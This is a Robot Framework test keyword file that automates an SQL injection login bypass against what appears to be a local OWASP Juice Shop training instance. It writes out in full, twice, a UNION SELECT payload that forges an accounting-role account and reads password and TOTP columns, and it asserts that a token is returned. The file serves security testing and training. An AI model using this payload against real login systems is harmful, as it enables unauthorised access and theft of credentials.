*** Settings ***
Resource    ../resource/settings.robot
*** Keywords ***
I click on account to log in
    Click      ${home.button_account}
I click on connect
    Click       ${home.button_login}
I fill in the field with the registered email address via SQL injection
    Fill Text        ${login.field_email}   ' UNION SELECT id,username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive,createdAt,updatedAt,deletedAt FROM Users UNION SELECT 1000, '', 'acc0unt4nt@juice-sh.op2', 'asdfasdf', 'accounting', '', '127.0.0.1', 'default.svg', '', 1, '2020-08-30 11:12:13', '2020-08-30 11:12:13', NULL;
I fill in the field with the registered password via SQL injection
    Fill Text        ${login.field_password}    abcd1234
I check if I have access to account ephemeral
    Wait For Elements State    ${home.id_account_admin}     visible    timeout=30
I click on the login button
    Click       ${login.button_login}
Generate Body
    [Arguments]    ${email}    ${password}
    ${body}=    Create Dictionary    email=${email}    password=${password}
    RETURN    ${body}
I perform the query using Union to create the nursing account
    ${HEADER}=             Create Dictionary    Content-Type=application/json
    ${COLOR_REQUEST}=            Generate Body   ' UNION SELECT id,username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive,createdAt,updatedAt,deletedAt FROM Users UNION SELECT 1000, '', 'acc0unt4nt@juice-sh.op2', 'asdfasdf', 'accounting', '', '127.0.0.1', 'default.svg', '', 1, '2020-08-30 11:12:13', '2020-08-30 11:12:13', NULL;    1234
    ${response}=    POST    url=http://localhost:3000/rest/user/login      json=${COLOR_REQUEST}   expected_status=200    headers=${HEADER}    
    Set Global Variable    ${response}
I verify the account creation
    ${json}=    Set Variable    ${response.json()}
    Log To Console  ${json}
    Should Contain  ${json}    authentication
    Should Contain  ${json["authentication"]}    token